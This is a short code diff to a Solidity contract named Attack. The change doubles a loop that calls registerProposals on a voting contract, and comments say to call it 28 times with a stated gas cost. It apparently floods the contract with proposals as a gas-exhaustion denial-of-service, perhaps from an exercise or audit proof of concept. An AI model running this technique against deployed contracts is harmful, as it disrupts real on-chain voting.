@@ -9,7 +9,7 @@ contract Attack {
     //You need to call this function 28 times
     function attackStep() external {
         // 200 iterations = 5 680 833 gas
-        for(uint i=0; i<100; i++)
+        for(uint i=0; i<200; i++)
             voting.registerProposals("attack");
     }
 
